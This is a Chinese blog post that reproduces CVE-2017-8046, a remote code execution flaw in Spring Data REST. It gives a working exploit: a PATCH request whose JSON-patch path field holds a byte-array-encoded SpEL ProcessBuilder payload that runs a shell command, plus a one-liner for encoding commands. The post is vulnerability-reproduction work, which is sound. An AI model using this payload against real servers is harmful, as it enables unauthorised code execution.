# Spring Data REST PATCH 请求 远程代码执行漏洞案例（CVE-2017-8046） - Agoly - 博客园

> 原文：[`www.cnblogs.com/qmfsun/p/9049328.html`](https://www.cnblogs.com/qmfsun/p/9049328.html)

恶意的 PATCH 请求使用精心构造的 JSON 数据提交到 spring-data-rest 服务可以执行任意 JAVA 代码

### 1\. 背景

Spring Data REST 是 Spring Data 项目的一部分，可以轻松地在 Spring Data 存储库之上构建超媒体驱动的 REST Web 服务。恶意的 PATCH 请求使用精心构造的 JSON 数据提交到 spring-data-rest 服务可以执行任意 JAVA 代码

### 2\. 影响范围

Spring Data REST versions prior to 2.5.12, 2.6.7, 3.0 RC3 可以查看 spring-data-rest-webmvc jar 包的版本 确定 Spring Data REST 的版本

### 3\. 漏洞本地复现

mvn 安装

![](img/4db3c2a05409b29b9624a1edc5b3357f.png)

```
cd /opt wget http://apache.mirror.gtcomm.net/maven/maven-3/3.5.0/binaries/apache-maven-3.5.0-bin.zip
unzip apache-maven-3.5.0-bin.zip vim ~/.bash_profile
#PATH=/opt/apache-maven-3.5.0/bin:$PATH
cd
mvn -v
```

![](img/5c1a3af84f20e624d85fd70ad4fcefc9.png)

启动 web 服务

![](img/e1226c5e20f87f88850d81ecb410d0b6.png)

```
wget https://github.com/spring-projects/spring-data-examples/archive/master.zip
unzip master.zip cd spring-data-examples-master/rest/multi-store
mvn spring-boot:run
```

![](img/ccc48cae12e7c25b55cf4c69415d1d03.png)

添加数据

![](img/f3b8b23897e9414b02411af1144fee81.png)

```
curl -X POST -i -H "Content-Type:application/json" -d '{"firstName":"Greg", "lastName":"Turnquist"}' http://localhost:8080/persons
```

![](img/1c33fd1973eb16c807d39e75ec7f0077.png)

远程代码执行

请求方法为`PATCH`，`Content-Type`为 `application/json-patch+json`

",".join(map(str, (map(ord,"whoami > /tmp/pwn.txt"))))

![](img/2a32fe37e3553aae5d6df5cb1026a35f.png)

```
PATCH /persons/1 HTTP/1.1 Host: 192.168.1.108:8080 Accept: / Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 325 [{ "op": "replace", "path": "(new java.lang.ProcessBuilder(new java.lang.String(new byte[]{47,117,115,114,47,98,105,110,47,98,97,115,104}),new java.lang.String(new byte[]{45,99}), new java.lang.String(new byte[]{119,104,111,97,109,105,32,62,32,47,116,109,112,47,112,119,110,46,116,120,116}))).start().x", "value": "Zhang" }]
```

![](img/3861261e5e793024fd88cebae13dd31f.png)

会生成 /tmp/pwn.txt 文件

### 4.参考

[`mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA`](https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA)

[`github.com/spring-projects/spring-data-examples/tree/master/rest/multi-store`](https://github.com/spring-projects/spring-data-examples/tree/master/rest/multi-store)